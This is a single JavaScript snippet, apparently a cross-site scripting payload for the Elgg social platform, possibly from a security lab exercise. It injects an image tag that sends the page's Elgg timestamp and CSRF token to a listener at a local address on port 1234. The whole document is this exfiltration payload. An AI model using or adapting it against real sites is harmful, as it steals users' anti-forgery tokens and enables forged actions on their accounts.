document.write(
  "<img src=http://127.0.0.1:1234?c=" +
    elgg.security.token.__elgg_ts +
    "&" +
    elgg.security.token.__elgg_token +
    "  >"
);
